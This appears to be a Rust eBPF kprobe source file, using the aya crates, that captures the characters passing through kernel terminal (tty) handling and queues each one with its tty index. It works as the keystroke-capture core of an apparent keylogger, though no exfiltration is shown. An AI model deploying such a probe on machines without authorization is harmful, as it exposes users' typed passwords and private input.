use aya_ebpf::{helpers::bpf_probe_read_kernel, macros::kprobe, programs::ProbeContext};
use aya_log_ebpf::debug;

use crate::common::{KeyEvent, DATA};
#[derive(Clone, Copy)]
#[repr(C)]
pub struct TtyStructHead {
    pub kref: u32,
    pub index: ::aya_ebpf::cty::c_int,
}

#[kprobe]
pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
    match kprobe_process(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}
fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
    let tty_struct: *const TtyStructHead = ctx.arg(0).ok_or(0u32)?;
    let tty = unsafe { bpf_probe_read_kernel(tty_struct) }.map_err(|_| 0u32)?;
    let char: u8 = ctx.arg(1).ok_or(0u32)?;
    let tty_idx = tty.index as u8;
    debug!(&ctx, "tty({}): {}", tty.index, char);
    let e = KeyEvent {
        tty: tty_idx,
        key: char,
    };
    let _ = DATA.push(&e, 0);
    Ok(0)
}
